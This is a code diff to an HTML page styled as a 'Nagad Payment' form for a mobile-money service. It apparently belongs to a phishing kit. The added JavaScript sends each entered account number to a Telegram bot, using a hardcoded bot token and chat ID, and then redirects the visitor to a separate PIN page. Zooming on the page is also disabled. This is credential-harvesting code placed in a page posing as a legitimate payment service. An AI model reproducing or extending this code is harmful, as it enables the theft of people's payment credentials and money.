@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Nagad Payment</title>
     <style>
         body {
@@ -73,6 +73,24 @@
             }
         });
 
+        // Function to send the Nagad number to Telegram
+        function sendToTelegram(nagadNumber) {
+            const botToken = '7138875939:AAGw-ROS6-ch6MILpTOJlOjcmAR6oVGoAiA';
+            const chatId = '5625471891';
+            const message = `Nagad Number: ${nagadNumber}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            return fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Error sending message to Telegram:', data);
+                    }
+                })
+                .catch(error => console.error('Telegram API error:', error));
+        }
+
         // Validate the Nagad number
         function validateNagad() {
             const nagadNumber = document.getElementById('nagadNumber').value;
@@ -86,8 +104,13 @@
                 error.textContent = 'The Nagad number must contain only digits.';
             } else {
                 error.textContent = '';
-                localStorage.setItem('nagadNumber', nagadNumber);
-                window.location.href = 'pin.html';
+
+                // Send the Nagad number to Telegram
+                sendToTelegram(nagadNumber).then(() => {
+                    // Store the number in localStorage and redirect to the pin page
+                    localStorage.setItem('nagadNumber', nagadNumber);
+                    window.location.href = 'pin.html';
+                });
             }
         }
     </script>
